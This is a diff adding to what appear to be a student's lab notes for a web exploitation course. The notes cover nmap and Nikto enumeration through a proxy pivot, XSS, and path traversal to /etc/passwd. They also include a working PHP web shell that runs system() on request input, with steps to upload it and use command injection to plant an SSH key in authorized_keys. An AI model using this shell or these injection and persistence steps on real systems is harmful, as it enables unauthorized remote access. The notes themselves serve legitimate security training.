@@ -43,12 +43,103 @@ JavaScript (JS)
 - JavaScript runs on the client’s machine
 - Coded as .JS files, or in-line of HTML
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-Enumeration
+Website Enumeration:
 
-- ROBOTS.txt
+- ssh root@10.50.24.104 -D 9050 (make sure you have a dynamic port forward established)
+
+      - proxychains nmap -Pn -T5 -sT -p 80 --script http-enum.nse <IP>
+      - proxychains nmap -Pn -T5 -sT -p 80 --script http-sql-injection.nse <IP>
       - proxychains nmap -Pn -T5 -sT -p 80 --script http-robots.txt.nse <IP>
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Nitko Demo
+
+**** nikto v -h <IP> ****
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Cross-Site Scripting (XSS): XSS is a form of attack in which untrusted Javascript is injected into a trusted website. This occurs when input from a user is displayed back without proper 
+sanitization. In XSS, the victim is not the server itself, but the browser of a visitor. 
+
+Refelcted XSS
+
+- Reflected attacks are those where the injected script is reflected off the web server, such as in an error message, search result, or any other response that includes some or all of the input
+  sent to the server as part of the request. Reflected attacks are delivered to victims via another route, such as in an e-mail message, or on some other website. When a user is tricked into
+  clicking on a malicious link, submitting a specially crafted form, or even just browsing to a malicious site, the injected code travels to the vulnerable web site, which reflects the attack
+  back to the user’s browser. The browser then executes the code because it came from a "trusted" server. Reflected XSS is also sometimes referred to as Non-Persistent or Type-II XSS."
+
+ Stored XSS
+
+- stored attacks are those where the injected script is permanently stored on the target servers, such as in a database, in a message forum, visitor log, comment field, etc. The victim then
+  retrieves the malicious script from the server when it requests the stored information. Stored XSS is also sometimes referred to as Persistent or Type-I XSS."
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Server-Side injection
+Ability to read/execute outside web server’s directory
+
+Directory Traversal/Path Traversal:
+- Uses ../../ (relative paths) in manipulating a server-side file path
+      Ex.) view_image.php?file=../../etc/passwd
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+<HTML><BODY>
+  <FORM METHOD="GET" NAME="myform" ACTION="">
+  <INPUT TYPE="text" NAME="cmd">
+  <INPUT TYPE="submit" VALUE="Send">
+  </FORM>
+  <pre>
+  <?php
+  if($_GET['cmd']) {
+    system($_GET['cmd']);
+    }
+  ?>
+  </pre>
+  </BODY></HTML>
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+DEMO: Malicious File Upload
+- Navigate to http://<float IP>
+- Create malicious file with code above and upload.
+- Navigate to /uploads and click your file or call it directly /uploads/<evil_file>
+- Conduct enumeration to determine how we could develop a secure shell
+- After enumeration, perform commands such as uploading your ssh key 
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+SSH Key Upload
+
+1.) SSH key setup (from the lin-ops station)
+    
+    -  ssh-keygen -t rsa
+           - hit enter (default)
+    
+    -  cat ~/.ssh/id_rsa.pub
+           -  The entire output is your public key. Make sure when uploading, you copy everything.
+
+2.) Upload (from web server)
+
+    - ; whoami 
+
+    - ; cat /etc/passwd
+          - Find where users home directory is at
+    
+    - ; ls -la <user home directory>
+          - look for a ssh directory
+    
+    - ; mkdir <user home directory>.ssh
+          - make .ssh in users home folder if it does not exist
+ 
+    - ; echo "your_public_key_here" >> <user home directory>.ssh/authorized_keys.
+
+    - ; cat /users/home/directory/.ssh/authorized_keys
+          - Verify key was uploaded successfully
+
+3.) Once this process has finished you should now be able to ssh on the target system as the user who is running the web server. If prompted for a password something has gone wrong.
+        - ssh <user>@<web ip>
 
 
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+
+
+
+
+
+
+
